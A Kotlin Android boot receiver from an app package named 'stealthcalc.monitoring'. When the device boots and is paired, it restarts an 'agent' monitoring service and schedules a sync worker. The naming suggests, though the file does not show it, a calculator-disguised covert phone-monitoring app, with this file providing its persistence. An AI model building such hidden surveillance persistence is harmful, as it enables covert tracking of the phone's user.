package com.stealthcalc.monitoring.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class AgentBootReceiver : BroadcastReceiver() {

    @Inject lateinit var repository: MonitoringRepository

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_BOOT_COMPLETED) return
        if (!repository.isAgent || !repository.isPaired) return

        AppLogger.log(context, "[agent]", "Boot completed — starting agent service")
        AgentService.start(context)
        AgentSyncWorker.schedule(context)
    }
}
